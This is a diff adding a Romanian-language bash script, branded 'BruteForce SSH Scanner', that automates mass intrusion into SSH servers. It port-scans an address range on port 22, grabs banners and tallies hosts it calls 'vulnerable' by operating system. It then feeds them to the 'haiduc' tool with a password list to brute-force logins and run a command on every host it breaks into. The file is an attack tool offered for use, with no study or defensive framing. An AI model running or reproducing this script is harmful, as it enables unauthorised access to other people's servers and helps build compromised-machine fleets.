@@ -1,0 +1,71 @@
+#!/bin/bash
+
+##################Setari#################
+port=22
+uidT=2500
+timeout=15
+banthread=350
+##################Setari#################
+
+
+##################Culori#################
+red=`tput setaf 1`
+green=`tput setaf 2`
+reset=`tput sgr0`
+##################Culori#################
+
+
+rm -rf i bios.txt ip.tmp scan.log banner.log
+clear
+echo "${green}~~~~~~~~~~~~~~~~~~[${red}BruteForce SSH Scanner${reset}${green}]~~~~~~~~~~~~~~~~~~${reset}"
+echo "${red}☣ ${reset}Arhiva creata de catre ${red}FaNeL Hacked${reset} pentru ${red}fanelishere.tk${reset}"
+echo "${green}~~~~~~~~~~~~~~~~~~[${red}BruteForce SSH Scanner${reset}${green}]~~~~~~~~~~~~~~~~~~${reset}"
+echo -e "${red}☣ ${reset}Port Scanner ${green}Pornit${reset}"
+sleep 3
+./ps2 $1 $port
+sleep 3
+cat bios.txt |shuf > ip.tmp
+cat ip.tmp |sort |uniq > ip2.tmp
+rm -rf ip.tmp
+cat ip2.tmp | uniq | shuf  > i
+rm -rf ip2.tmp
+wc -l i
+echo -e "${red}☣ ${reset}Port Scanner ${red}Oprit${reset}"
+pkill -f ps2
+echo -e "${red}☣ ${reset}Banner ${green}Pornit${reset}"
+./banner bios.txt $port $banthread > /dev/null
+echo -e "${red}☣ ${reset}Asteptam 3 secunde.."
+sleep 3
+wc -l banner.log
+rm -rf i
+echo -e "${red}☣ ${reset}Banner ${red}Oprit${reset}"
+pkill -f banner
+
+vulns=$(cat banner.log |wc -l) > /dev/null
+ubuntu=$(cat  banner.log  |grep Ubuntu  |wc -l) > /dev/null
+debian=$(cat banner.log  |grep Debian  |wc -l) > /dev/null
+freebsd=$(cat banner.log  |grep FreeBSD |wc -l) > /dev/null
+altele=$(cat banner.log |grep -v FreeBSD |grep -v Debian |grep -v Ubuntu |wc -l) > /dev/null
+echo -e "${red}☣ ${reset}Am gasit: ${green}[${reset}${red}$vulns${reset}${green}]${reset} servere vulnerabile"
+echo -e "${red}☣ ${reset}Am gasit: ${green}[${reset}${red}$ubuntu${reset}${green}]${reset} Ubunturi"
+echo -e "${red}☣ ${reset}Am gasit: ${green}[${reset}${red}$debian${reset}${green}]${reset} Debiane"
+echo -e "${red}☣ ${reset}Am gasit: ${green}[${reset}${red}$freebsd${reset}${green}]${reset} FreeBSD-URI"
+echo -e "${red}☣ ${reset}Am gasit: ${green}[${reset}${red}$altele${reset}${green}]${reset} Alte-VPSURI"
+cat banner.log | grep OpenSSH|cut -d ":" -f 1 > i
+
+ipscount=`grep -c . i`
+
+sleep 10
+
+pass=$(cat pass.fnl | wc -l);
+ips=$(cat i | wc -l);
+
+echo -e "${red}☣ ${reset}${green}[${reset}${red} BruteForce ${reset}${green}]${reset} - ${green}[${reset} Clasa: ${red}$1${reset} ${green}]${reset} - ${green}[${reset} Ipurile: ${red}$ips${reset} ipuri ${green}]${reset} - ${green}[${reset} ${red}$pass${reset} Parole ${green}]${reset}"
+sleep 10
+
+./haiduc $uidT -f i pass.fnl $port "lscpu"
+pkill -f haiduc
+sleep 5
+echo "${green}~~~~~~~~~~~~~~~~[${red}BruteForce SSH Scanner${reset}${green}]}~~~~~~~~~~~~~~~${reset}"
+echo "${red}☣ ${reset}Sa terminat scanarea ba bulangiule ia si schimba ${red}clasa${reset}."
+echo "${green}~~~~~~~~~~~~~~~~[${red}BruteForce SSH Scanner${reset}${green}]~~~~~~~~~~~~~~~~${reset}"
